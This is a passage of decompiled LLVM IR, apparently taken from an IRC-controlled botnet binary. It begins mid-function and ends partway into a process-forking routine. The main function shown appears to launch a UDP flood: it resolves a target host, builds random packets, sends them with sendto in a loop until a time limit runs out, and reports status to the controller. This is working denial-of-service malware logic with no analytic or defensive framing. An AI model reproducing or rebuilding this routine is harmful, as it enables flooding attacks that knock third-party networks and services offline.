  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v12_804eea6 = ptrtoint i32* %stack_var_-108 to i32
  %v5_804eeb7 = icmp ult i32* %stack_var_-108, inttoptr (i32 12 to i32*)
  store i1 %v5_804eeb7, i1* %cf.global-to-local, align 1
  %v2_804eebc = call i32 @__GI_time(i32* null)
  store i32 %v2_804eebc, i32* @eax, align 4
  %v4_804eec7 = add i32 %arg3, -3
  %v8_804eec7 = icmp ult i32 %arg3, 3
  %v9_804eec7 = sub i32 2, %arg3
  %v10_804eec7 = and i32 %v9_804eec7, %arg3
  %v11_804eec7 = icmp slt i32 %v10_804eec7, 0
  store i1 %v8_804eec7, i1* %cf.global-to-local, align 1
  %v12_804eec7 = icmp eq i32 %v4_804eec7, 0
  %v13_804eec7 = icmp slt i32 %v4_804eec7, 0
  %v3_804eecb = icmp eq i1 %v13_804eec7, %v11_804eec7
  %v4_804eecb = icmp eq i1 %v12_804eec7, false
  %v5_804eecb = and i1 %v4_804eecb, %v3_804eecb
  br i1 %v5_804eecb, label %dec_label_pc_804eeed, label %dec_label_pc_804eecd

dec_label_pc_804eecd:                             ; preds = %entry
  %v5_804eecd = icmp ult i32* %stack_var_-108, inttoptr (i32 4 to i32*)
  store i1 %v5_804eecd, i1* %cf.global-to-local, align 1
  %v3_804eedb = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_8069a18.205 to i32))
  store i32 %v3_804eedb, i32* %eax.global-to-local, align 4
  store i1 %v5_804eeb7, i1* %cf.global-to-local, align 1
  %v1_804eee8 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804eee8, i32* @eax, align 4
  %v0_804eeed.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eeed

dec_label_pc_804eeed:                             ; preds = %entry, %dec_label_pc_804eecd
  %v0_804eeed = phi i32 [ %v12_804eea6, %entry ], [ %v0_804eeed.pre, %dec_label_pc_804eecd ]
  %v5_804eeed = icmp ult i32 %v0_804eeed, 12
  store i1 %v5_804eeed, i1* %cf.global-to-local, align 1
  %v1_804eef3 = call i32 @mfork(i32 %arg2)
  store i32 %v1_804eef3, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eefb = icmp eq i32 %v1_804eef3, 0
  %v1_804eefd = icmp eq i1 %v1_804eefb, false
  br i1 %v1_804eefd, label %dec_label_pc_804f1a1, label %dec_label_pc_804ef03

dec_label_pc_804ef03:                             ; preds = %dec_label_pc_804eeed
  store i1 %v5_804eeb7, i1* %cf.global-to-local, align 1
  %v1_804ef0b = call i32 @malloc(i32 1024)
  store i32 %v1_804ef0b, i32* %eax.global-to-local, align 4
  %v5_804ef16 = icmp ult i32* %stack_var_-108, inttoptr (i32 4 to i32*)
  store i1 %v5_804ef16, i1* %cf.global-to-local, align 1
  %v4_804ef23 = inttoptr i32 %v1_804ef0b to i8*
  %v5_804ef23 = call i32 @__GI_memset(i8* %v4_804ef23, i32 0, i32 1024)
  %v1_804ef2e = add i32 %arg4, 8
  %v5_804ef2e = icmp ugt i32 %arg4, -9
  store i1 %v5_804ef2e, i1* %cf.global-to-local, align 1
  store i32 %v1_804ef2e, i32* %eax.global-to-local, align 4
  %v1_804ef31 = inttoptr i32 %v1_804ef2e to i32*
  %v2_804ef31 = load i32, i32* %v1_804ef31, align 4
  store i32 %v2_804ef31, i32* %eax.global-to-local, align 4
  %v4_804ef45 = inttoptr i32 %v2_804ef31 to i8*
  %v7_804ef4e = call i32 @_strncmp(i8* %v4_804ef45, i8* bitcast (i8** @global_var_8069a6d.206 to i8*), i32 2)
  %v8_804ef4e = urem i32 %v7_804ef4e, 2
  %v9_804ef4e = icmp eq i32 %v8_804ef4e, 0
  %v0_804ef50 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ef50 = or i1 %v0_804ef50, %v9_804ef4e
  %v3_804ef50 = zext i1 %v2_804ef50 to i32
  %v4_804ef50 = load i32, i32* @edx, align 4
  %v5_804ef50 = and i32 %v4_804ef50, -256
  %v6_804ef50 = or i32 %v3_804ef50, %v5_804ef50
  %v7_804ef50 = xor i32 %v6_804ef50, 1
  store i32 %v7_804ef50, i32* %edx.global-to-local, align 4
  %v1_804ef58 = trunc i32 %v7_804ef50 to i8
  %v3_804ef58 = zext i1 %v0_804ef50 to i8
  %v15_804ef58 = icmp eq i8 %v1_804ef58, %v3_804ef58
  %v1_804ef61 = icmp eq i1 %v15_804ef58, false
  %v1_804ef6d = add i32 %arg4, 12
  %v5_804ef6d = icmp ugt i32 %arg4, -13
  store i1 %v5_804ef6d, i1* %cf.global-to-local, align 1
  store i32 %v1_804ef6d, i32* %eax.global-to-local, align 4
  %v1_804ef70 = inttoptr i32 %v1_804ef6d to i32*
  %v2_804ef70 = load i32, i32* %v1_804ef70, align 4
  store i32 %v2_804ef70, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804ef84 = inttoptr i32 %v2_804ef70 to i8*
  store i32 %v2_804ef70, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_8069a6d.206 to i32), i32* @edi, align 4
  %v7_804ef8d = call i32 @_strncmp(i8* %v4_804ef84, i8* bitcast (i8** @global_var_8069a6d.206 to i8*), i32 2)
  %v8_804ef8d = urem i32 %v7_804ef8d, 2
  %v9_804ef8d = icmp eq i32 %v8_804ef8d, 0
  %v0_804ef8f = load i1, i1* %cf.global-to-local, align 1
  %v2_804ef8f = or i1 %v0_804ef8f, %v9_804ef8d
  %v3_804ef8f = zext i1 %v2_804ef8f to i32
  %v4_804ef8f = load i32, i32* %edx.global-to-local, align 4
  %v5_804ef8f = and i32 %v4_804ef8f, -256
  %v6_804ef8f = or i32 %v3_804ef8f, %v5_804ef8f
  %v7_804ef8f = xor i32 %v6_804ef8f, 1
  store i32 %v7_804ef8f, i32* %edx.global-to-local, align 4
  %v1_804ef97 = trunc i32 %v7_804ef8f to i8
  %v3_804ef97 = zext i1 %v0_804ef8f to i8
  %v4_804ef97 = sub nsw i8 %v1_804ef97, %v3_804ef97
  %v15_804ef97 = icmp eq i8 %v4_804ef97, 0
  %v2_804ef9b = sext i8 %v4_804ef97 to i32
  store i32 %v2_804ef9b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804efa0 = icmp eq i1 %v15_804ef97, false
  br i1 %v1_804efa0, label %dec_label_pc_804efb2, label %dec_label_pc_804efbd

dec_label_pc_804efb2:                             ; preds = %dec_label_pc_804ef03
  store i1 %v5_804ef6d, i1* %cf.global-to-local, align 1
  store i32 %v1_804ef6d, i32* %eax.global-to-local, align 4
  %v2_804efb8 = load i32, i32* %v1_804ef70, align 4
  store i32 %v2_804efb8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804efbd

dec_label_pc_804efbd:                             ; preds = %dec_label_pc_804ef03, %dec_label_pc_804efb2
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_804efb2 ], [ 1, %dec_label_pc_804ef03 ]
  %v0_804efbd = load i32, i32* @esp, align 4
  %v5_804efbd = icmp ult i32 %v0_804efbd, 12
  store i1 %v5_804efbd, i1* %cf.global-to-local, align 1
  %v2_804efc2 = call i32 @__GI_time(i32* null)
  store i32 %v2_804efc2, i32* %eax.global-to-local, align 4
  store i1 %v5_804eeb7, i1* %cf.global-to-local, align 1
  %v1_804efce = call i32 @srand(i32 %v2_804efc2)
  %v1_804efd9 = add i32 %arg4, 16
  store i32 %v1_804efd9, i32* %eax.global-to-local, align 4
  %v1_804efdc = inttoptr i32 %v1_804efd9 to i32*
  %v2_804efdc = load i32, i32* %v1_804efdc, align 4
  store i32 %v2_804efdc, i32* %eax.global-to-local, align 4
  store i1 %v5_804eeb7, i1* %cf.global-to-local, align 1
  %v1_804efe2 = call i32 @atol(i32 %v2_804efdc)
  store i1 %v5_804ef16, i1* %cf.global-to-local, align 1
  %v2_804eff4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804eff4, i32* %eax.global-to-local, align 4
  %v4_804eff8 = bitcast i32* %stack_var_-72 to i8*
  %v5_804eff8 = call i32 @__GI_memset(i8* %v4_804eff8, i32 0, i32 16)
  %v1_804f003 = add i32 %arg4, 4
  store i32 %v1_804f003, i32* %eax.global-to-local, align 4
  %v1_804f006 = inttoptr i32 %v1_804f003 to i32*
  %v2_804f006 = load i32, i32* %v1_804f006, align 4
  store i32 %v2_804f006, i32* %eax.global-to-local, align 4
  %v5_804f008 = icmp ult i32* %stack_var_-108, inttoptr (i32 8 to i32*)
  store i1 %v5_804f008, i1* %cf.global-to-local, align 1
  %v3_804f00f = call i32 @host2ip(i32 %arg2, i32 %v2_804f006)
  store i32 %v3_804f00f, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-72, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f024 = icmp eq i1 %v1_804ef61, false
  br i1 %v1_804f024, label %dec_label_pc_804f05a, label %dec_label_pc_804f026

dec_label_pc_804f026:                             ; preds = %dec_label_pc_804efbd
  store i32 %v1_804ef2e, i32* %eax.global-to-local, align 4
  %v2_804f02c = load i32, i32* %v1_804ef31, align 4
  store i32 %v2_804f02c, i32* %eax.global-to-local, align 4
  store i1 %v5_804eeb7, i1* %cf.global-to-local, align 1
  %v1_804f032 = call i32 @atol(i32 %v2_804f02c)
  %v1_804f03a = urem i32 %v1_804f032, 65536
  store i32 %v1_804f03a, i32* %eax.global-to-local, align 4
  store i1 %v5_804eeb7, i1* %cf.global-to-local, align 1
  %v1_804f043 = call i32 @htons(i32 %v1_804f03a)
  %v2_804f043 = trunc i32 %v1_804f043 to i16
  store i1 %v5_804ef6d, i1* %cf.global-to-local, align 1
  store i32 %v1_804ef6d, i32* %eax.global-to-local, align 4
  %v2_804f055 = load i32, i32* %v1_804ef70, align 4
  store i32 %v2_804f055, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f05a

dec_label_pc_804f05a:                             ; preds = %dec_label_pc_804efbd, %dec_label_pc_804f026
  %stack_var_-70.0 = phi i16 [ %v2_804f043, %dec_label_pc_804f026 ], [ %tmp23, %dec_label_pc_804efbd ]
  store i32 %v1_804ef2e, i32* %eax.global-to-local, align 4
  %v2_804f060 = load i32, i32* %v1_804ef31, align 4
  store i32 %v2_804f060, i32* %edx.global-to-local, align 4
  store i32 %v1_804f003, i32* %eax.global-to-local, align 4
  %v2_804f068 = load i32, i32* %v1_804f006, align 4
  store i32 %v2_804f068, i32* %eax.global-to-local, align 4
  store i1 %v5_804f008, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %stack_var_-140, align 4
  %v3_804f07d = call i32 @Send(i32 %arg1, i32 ptrtoint ([49 x i8]* @global_var_8069a78.208 to i32))
  store i32 %v3_804f07d, i32* %eax.global-to-local, align 4
  %v0_804f082 = load i32, i32* @esp, align 4
  %v2_804f082 = icmp ugt i32 %v0_804f082, -33
  store i1 %v2_804f082, i1* %cf.global-to-local, align 1
  %v8_804f0b5 = icmp eq i32 %stack_var_-36.0, 0
  %v12_804f0b5 = icmp eq i32 %stack_var_-36.0, 1
  %v5_804f173 = add i32 %v1_804efe2, %v2_804eebc
  %v1_804f129 = and i32 %v1_804ef0b, -256
  %v1_804f089 = icmp eq i1 %v1_804f024, false
  %v1_804f0b9 = icmp eq i1 %v12_804f0b5, false
  br label %dec_label_pc_804f085

dec_label_pc_804f085:                             ; preds = %dec_label_pc_804f181, %dec_label_pc_804f05a
  %v0_804f08b = phi i32 [ %v12_804eea6, %dec_label_pc_804f05a ], [ %v0_804f08b17, %dec_label_pc_804f181 ]
  %stack_var_-52.0 = phi i32 [ %tmp, %dec_label_pc_804f05a ], [ %v4_804f181, %dec_label_pc_804f181 ]
  %stack_var_-104.0 = phi i32 [ %tmp21, %dec_label_pc_804f05a ], [ %stack_var_-104.1, %dec_label_pc_804f181 ]
  %stack_var_-70.1 = phi i16 [ %stack_var_-70.0, %dec_label_pc_804f05a ], [ %stack_var_-70.2, %dec_label_pc_804f181 ]
  store i1 %v1_804ef61, i1* %cf.global-to-local, align 1
  br i1 %v1_804f089, label %dec_label_pc_804f0b5, label %dec_label_pc_804f08b

dec_label_pc_804f08b:                             ; preds = %dec_label_pc_804f085
  %v5_804f08b = icmp ult i32 %v0_804f08b, 8
  store i1 %v5_804f08b, i1* %cf.global-to-local, align 1
  %v1_804f08e = add i32 %v0_804f08b, -12
  %v2_804f08e = inttoptr i32 %v1_804f08e to i32*
  store i32 65535, i32* %v2_804f08e, align 4
  %v1_804f093 = add i32 %v0_804f08b, -16
  %v2_804f093 = inttoptr i32 %v1_804f093 to i32*
  store i32 1026, i32* %v2_804f093, align 4
  %v0_804f098 = load i32, i32* %stack_var_-140, align 4
  %v3_804f098 = call i32 @realrand(i32 %v0_804f098, i32 ptrtoint ([49 x i8]* @global_var_8069a78.208 to i32))
  %v0_804f09d = load i32, i32* @esp, align 4
  %v1_804f09d = add i32 %v0_804f09d, 16
  %v1_804f0a0 = urem i32 %v3_804f098, 65536
  store i32 %v1_804f0a0, i32* %eax.global-to-local, align 4
  %v5_804f0a5 = icmp ult i32 %v1_804f09d, 12
  store i1 %v5_804f0a5, i1* %cf.global-to-local, align 1
  %v3_804f0a8 = inttoptr i32 %v0_804f09d to i32*
  store i32 %v1_804f0a0, i32* %v3_804f0a8, align 4
  %v0_804f0a9 = load i32, i32* %stack_var_-140, align 4
  %v1_804f0a9 = call i32 @htons(i32 %v0_804f0a9)
  %v2_804f0a9 = trunc i32 %v1_804f0a9 to i16
  store i32 %v1_804f0a9, i32* %eax.global-to-local, align 4
  %v0_804f0ae = load i32, i32* @esp, align 4
  %v1_804f0ae = add i32 %v0_804f0ae, 16
  %v2_804f0ae = icmp ugt i32 %v0_804f0ae, -17
  store i1 %v2_804f0ae, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f0b5

dec_label_pc_804f0b5:                             ; preds = %dec_label_pc_804f085, %dec_label_pc_804f08b
  %v0_804f0e6 = phi i32 [ %v0_804f08b, %dec_label_pc_804f085 ], [ %v1_804f0ae, %dec_label_pc_804f08b ]
  %stack_var_-70.2 = phi i16 [ %stack_var_-70.1, %dec_label_pc_804f085 ], [ %v2_804f0a9, %dec_label_pc_804f08b ]
  store i1 %v8_804f0b5, i1* %cf.global-to-local, align 1
  br i1 %v1_804f0b9, label %dec_label_pc_804f0de, label %dec_label_pc_804f0bb

dec_label_pc_804f0bb:                             ; preds = %dec_label_pc_804f0b5
  %v5_804f0bb = icmp ult i32 %v0_804f0e6, 8
  store i1 %v5_804f0bb, i1* %cf.global-to-local, align 1
  %v1_804f0be = add i32 %v0_804f0e6, -12
  %v2_804f0be = inttoptr i32 %v1_804f0be to i32*
  store i32 1024, i32* %v2_804f0be, align 4
  %v1_804f0c3 = add i32 %v0_804f0e6, -16
  %v2_804f0c3 = inttoptr i32 %v1_804f0c3 to i32*
  store i32 64, i32* %v2_804f0c3, align 4
  %v1_804f0c5 = sext i16 %stack_var_-70.2 to i32
  %v3_804f0c5 = call i32 @realrand(i32 %v1_804f0c5, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f0c5, i32* %eax.global-to-local, align 4
  %v0_804f0ca = load i32, i32* @esp, align 4
  %tmp55 = and i32 %v0_804f0ca, -8
  %v5_804f0cd = icmp eq i32 %tmp55, -16
  store i1 %v5_804f0cd, i1* %cf.global-to-local, align 1
  %v2_804f0d0 = add i32 %v0_804f0ca, 4
  %v3_804f0d0 = inttoptr i32 %v2_804f0d0 to i32*
  store i32 %v3_804f0c5, i32* %v3_804f0d0, align 4
  %v6_804f0d1 = inttoptr i32 %v0_804f0ca to i32*
  store i32 %v1_804ef0b, i32* %v6_804f0d1, align 4
  %v2_804f0d4 = inttoptr i32 %v1_804f0c5 to i8*
  %v3_804f0d4 = call i32 @makeRandomShit(i8* %v2_804f0d4)
  br label %dec_label_pc_804f101

dec_label_pc_804f0de:                             ; preds = %dec_label_pc_804f0b5
  store i32 %v1_804ef6d, i32* %eax.global-to-local, align 4
  %v2_804f0e4 = load i32, i32* %v1_804ef70, align 4
  store i32 %v2_804f0e4, i32* %eax.global-to-local, align 4
  %v5_804f0e6 = icmp ult i32 %v0_804f0e6, 12
  store i1 %v5_804f0e6, i1* %cf.global-to-local, align 1
  %v2_804f0e9 = add i32 %v0_804f0e6, -16
  %v3_804f0e9 = inttoptr i32 %v2_804f0e9 to i32*
  store i32 %v2_804f0e4, i32* %v3_804f0e9, align 4
  %v1_804f0ea = sext i16 %stack_var_-70.2 to i32
  %v2_804f0ea = call i32 @atol(i32 %v1_804f0ea)
  store i32 %v2_804f0ea, i32* %eax.global-to-local, align 4
  %v0_804f0ef = load i32, i32* @esp, align 4
  %tmp56 = and i32 %v0_804f0ef, -8
  %v5_804f0f2 = icmp eq i32 %tmp56, -16
  store i1 %v5_804f0f2, i1* %cf.global-to-local, align 1
  %v2_804f0f5 = add i32 %v0_804f0ef, 4
  %v3_804f0f5 = inttoptr i32 %v2_804f0f5 to i32*
  store i32 %v2_804f0ea, i32* %v3_804f0f5, align 4
  %v6_804f0f6 = inttoptr i32 %v0_804f0ef to i32*
  store i32 %v1_804ef0b, i32* %v6_804f0f6, align 4
  %v2_804f0f9 = inttoptr i32 %v1_804f0ea to i8*
  %v3_804f0f9 = call i32 @makeRandomShit(i8* %v2_804f0f9)
  br label %dec_label_pc_804f101

dec_label_pc_804f101:                             ; preds = %dec_label_pc_804f0bb, %dec_label_pc_804f0de
  %storemerge = phi i32 [ %v3_804f0d4, %dec_label_pc_804f0bb ], [ %v3_804f0f9, %dec_label_pc_804f0de ]
  %v1_804f10a.pre-phi = phi i32 [ %v1_804f0c5, %dec_label_pc_804f0bb ], [ %v1_804f0ea, %dec_label_pc_804f0de ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v0_804f0d9.sink = load i32, i32* @esp, align 4
  %tmp57 = and i32 %v0_804f0d9.sink, -4
  %v5_804f101 = icmp eq i32 %tmp57, -16
  store i1 %v5_804f101, i1* %cf.global-to-local, align 1
  %v1_804f104 = add i32 %v0_804f0d9.sink, 8
  %v2_804f104 = inttoptr i32 %v1_804f104 to i32*
  store i32 17, i32* %v2_804f104, align 4
  %v1_804f106 = add i32 %v0_804f0d9.sink, 4
  %v2_804f106 = inttoptr i32 %v1_804f106 to i32*
  store i32 2, i32* %v2_804f106, align 4
  %v2_804f108 = inttoptr i32 %v0_804f0d9.sink to i32*
  store i32 2, i32* %v2_804f108, align 4
  %v4_804f10a = call i32 @socket(i32 %v1_804f10a.pre-phi, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f10a, i32* %eax.global-to-local, align 4
  %v0_804f10f = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f115 = icmp slt i32 %v4_804f10a, 0
  br i1 %v5_804f115, label %dec_label_pc_804f15b, label %dec_label_pc_804f11b

dec_label_pc_804f11b:                             ; preds = %dec_label_pc_804f101
  store i32 %v2_804eff4, i32* %edx.global-to-local, align 4
  store i32 %v1_804f129, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_804ef0b, i32* @edi, align 4
  %v3_804f12f = call i32 @_strlen(i8* %v4_804ef23)
  %v4_804f12f = mul i32 %v3_804f12f, -1
  %v5_804f12f = add i32 %v4_804f12f, -2
  store i32 %v5_804f12f, i32* @ecx, align 4
  %v1_804f135 = sub i32 0, %v4_804f12f
  store i32 %v1_804f135, i32* %eax.global-to-local, align 4
  %v0_804f136 = load i32, i32* @esp, align 4
  %v5_804f136 = icmp ult i32 %v0_804f136, 8
  store i1 %v5_804f136, i1* %cf.global-to-local, align 1
  %v1_804f139 = add i32 %v0_804f136, -12
  %v2_804f139 = inttoptr i32 %v1_804f139 to i32*
  store i32 16, i32* %v2_804f139, align 4
  %v2_804f13b = add i32 %v0_804f136, -16
  %v3_804f13b = inttoptr i32 %v2_804f13b to i32*
  store i32 %v2_804eff4, i32* %v3_804f13b, align 4
  %v1_804f13c = add i32 %v0_804f136, -20
  %v2_804f13c = inttoptr i32 %v1_804f13c to i32*
  store i32 0, i32* %v2_804f13c, align 4
  %v0_804f13e = load i32, i32* %eax.global-to-local, align 4
  %v2_804f13e = add i32 %v0_804f136, -24
  %v3_804f13e = inttoptr i32 %v2_804f13e to i32*
  store i32 %v0_804f13e, i32* %v3_804f13e, align 4
  %v5_804f13f = add i32 %v0_804f136, -28
  %v6_804f13f = inttoptr i32 %v5_804f13f to i32*
  store i32 %v1_804ef0b, i32* %v6_804f13f, align 4
  %v5_804f142 = add i32 %v0_804f136, -32
  %v6_804f142 = inttoptr i32 %v5_804f142 to i32*
  store i32 %v4_804f10a, i32* %v6_804f142, align 4
  %v8_804f145 = call i32 @sendto(i32 %v1_804ef0b, i32 2, i32 ptrtoint (i8** @global_var_8069a6d.206 to i32), i32 %v2_804ef70, i32 2, i32 ptrtoint (i8** @global_var_8069a6d.206 to i32))
  store i32 %v8_804f145, i32* %eax.global-to-local, align 4
  %v0_804f14a = load i32, i32* @esp, align 4
  %v1_804f14a = add i32 %v0_804f14a, 32
  %v5_804f14d = icmp ult i32 %v1_804f14a, 12
  store i1 %v5_804f14d, i1* %cf.global-to-local, align 1
  %v5_804f150 = add i32 %v0_804f14a, 16
  %v6_804f150 = inttoptr i32 %v5_804f150 to i32*
  store i32 %v4_804f10a, i32* %v6_804f150, align 4
  %v1_804f153 = call i32 @close(i32 %v1_804ef0b)
  store i32 %v1_804f153, i32* %eax.global-to-local, align 4
  %v0_804f158 = load i32, i32* @esp, align 4
  %v2_804f158 = icmp ugt i32 %v0_804f158, -17
  store i1 %v2_804f158, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f15b

dec_label_pc_804f15b:                             ; preds = %dec_label_pc_804f101, %dec_label_pc_804f11b
  %v0_804f161.in = phi i32 [ %v0_804f10f, %dec_label_pc_804f101 ], [ %v0_804f158, %dec_label_pc_804f11b ]
  %stack_var_-104.1 = phi i32 [ %stack_var_-104.0, %dec_label_pc_804f101 ], [ %v1_804ef0b, %dec_label_pc_804f11b ]
  %v0_804f161 = add i32 %v0_804f161.in, 16
  %v9_804f15b = icmp ult i32 %stack_var_-52.0, 99
  store i1 %v9_804f15b, i1* %cf.global-to-local, align 1
  %v7_804f15f = icmp sgt i32 %stack_var_-52.0, 99
  br i1 %v7_804f15f, label %dec_label_pc_804f161, label %dec_label_pc_804f181

dec_label_pc_804f161:                             ; preds = %dec_label_pc_804f15b
  %v5_804f161 = icmp ult i32 %v0_804f161, 12
  store i1 %v5_804f161, i1* %cf.global-to-local, align 1
  %v2_804f164 = inttoptr i32 %v0_804f161.in to i32*
  store i32 0, i32* %v2_804f164, align 4
  %v1_804f166 = inttoptr i32 %stack_var_-104.1 to i32*
  %v2_804f166 = call i32 @__GI_time(i32* %v1_804f166)
  %v0_804f16b = load i32, i32* @esp, align 4
  %v1_804f16b = add i32 %v0_804f16b, 16
  store i32 %v2_804f166, i32* %edx.global-to-local, align 4
  store i32 %v5_804f173, i32* %eax.global-to-local, align 4
  %v7_804f176 = icmp ult i32 %v2_804f166, %v5_804f173
  store i1 %v7_804f176, i1* %cf.global-to-local, align 1
  %v1_804f178 = icmp eq i1 %v7_804f176, false
  br i1 %v1_804f178, label %dec_label_pc_804f189, label %dec_label_pc_804f181

dec_label_pc_804f181:                             ; preds = %dec_label_pc_804f161, %dec_label_pc_804f15b
  %v0_804f08b17 = phi i32 [ %v0_804f161, %dec_label_pc_804f15b ], [ %v1_804f16b, %dec_label_pc_804f161 ]
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_804f15b ], [ 0, %dec_label_pc_804f161 ]
  %v4_804f181 = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_804f085

dec_label_pc_804f189:                             ; preds = %dec_label_pc_804f161
  %v5_804f189 = icmp ult i32 %v1_804f16b, 12
  store i1 %v5_804f189, i1* %cf.global-to-local, align 1
  %v6_804f18c = inttoptr i32 %v0_804f16b to i32*
  store i32 %v4_804f10a, i32* %v6_804f18c, align 4
  %v1_804f18f = call i32 @close(i32 %stack_var_-52.0)
  store i32 %v1_804f18f, i32* %eax.global-to-local, align 4
  %v0_804f194 = load i32, i32* @esp, align 4
  %v1_804f194 = add i32 %v0_804f194, 16
  %v5_804f197 = icmp ult i32 %v1_804f194, 12
  store i1 %v5_804f197, i1* %cf.global-to-local, align 1
  %v2_804f19a = inttoptr i32 %v0_804f194 to i32*
  store i32 0, i32* %v2_804f19a, align 4
  %v1_804f19c = call i32 @__GI_exit(i32 %stack_var_-52.0)
  store i32 %v1_804f19c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f1a1

dec_label_pc_804f1a1:                             ; preds = %dec_label_pc_804eeed, %dec_label_pc_804f189
  %v0_804f1a7 = phi i32 [ %v1_804eef3, %dec_label_pc_804eeed ], [ %v1_804f19c, %dec_label_pc_804f189 ]
  ret i32 %v0_804f1a7

; uselistorder directives
  uselistorder i32 %stack_var_-104.1, { 1, 0 }
  uselistorder i32 %v0_804f0d9.sink, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804f0ef, { 1, 2, 0 }
  uselistorder i32 %v0_804f0ca, { 1, 2, 0 }
  uselistorder i16 %stack_var_-70.2, { 2, 0, 1 }
  uselistorder i32 %v0_804f0e6, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v1_804f0a9, { 1, 0 }
  uselistorder i32 %v1_804f0a0, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_804f08b, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804f03a, { 1, 0 }
  uselistorder i1 %v5_804f008, { 1, 0 }
  uselistorder i1 %v0_804ef8f, { 1, 0 }
  uselistorder i32* %v1_804ef70, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ef6d, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v0_804ef50, { 1, 0 }
  uselistorder i32* %v1_804ef31, { 1, 0, 2 }
  uselistorder i32 %v1_804ef2e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ef0b, { 1, 2, 3, 4, 6, 7, 0, 5, 8, 9 }
  uselistorder i32 %v4_804eec7, { 1, 0 }
  uselistorder i1 %v5_804eeb7, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32* %stack_var_-108, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32, i32)* @host2ip, { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8069a6d.206, { 1, 0 }
  uselistorder i32 %arg4, { 5, 4, 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f1a1, { 1, 0 }
  uselistorder label %dec_label_pc_804f15b, { 1, 0 }
  uselistorder label %dec_label_pc_804f101, { 1, 0 }
  uselistorder label %dec_label_pc_804f0b5, { 1, 0 }
  uselistorder label %dec_label_pc_804f05a, { 1, 0 }
  uselistorder label %dec_label_pc_804efbd, { 1, 0 }
  uselistorder label %dec_label_pc_804eeed, { 1, 0 }
}

define i32 @listFork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f1a8 = load i32, i32* @ebp, align 4
  store i32 %v0_804f1a8, i32* %stack_var_-4, align 4
  %v4_804f1a8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804f1a8, i32* @ebp, align 4
  %v1_804f1ae = call i32 @fork(i32 %v0_804f1a8)
  %v4_804f1b6 = icmp eq i32 %v1_804f1ae, 0
  %v1_804f1ba = icmp eq i1 %v4_804f1b6, false
  br i1 %v1_804f1ba, label %dec_label_pc_804f1c7, label %dec_label_pc_804f254

dec_label_pc_804f1c7:                             ; preds = %entry
  %v0_804f1c7 = load i32, i32* @global_var_80748f4.31, align 4
  %v1_804f1cc = add i32 %v0_804f1c7, 1
  store i32 %v1_804f1cc, i32* @global_var_80748f4.31, align 4
  %v2_804f1d7 = mul i32 %v1_804f1cc, 4
  %v1_804f1da = add i32 %v2_804f1d7, 4
  %v1_804f1e1 = call i32 @malloc(i32 %v1_804f1da)
  %v0_804f21711 = load i32, i32* @global_var_80748f4.31, align 4
  %v6_804f22013 = icmp eq i32 %v0_804f21711, 1
  br i1 %v6_804f22013, label %dec_label_pc_804f222, label %dec_label_pc_804f1f5

dec_label_pc_804f1f5:                             ; preds = %dec_label_pc_804f1c7, %dec_label_pc_804f1f5
  %storemerge114 = phi i32 [ %v4_804f214, %dec_label_pc_804f1f5 ], [ 0, %dec_label_pc_804f1c7 ]
  %v2_804f1f8 = mul i32 %storemerge114, 4
  %v5_804f1fd = add i32 %v2_804f1f8, %v1_804f1e1
  store i32 %v5_804f1fd, i32* @ecx, align 4
  %v0_804f208 = load i32, i32* @global_var_807e574.32, align 4
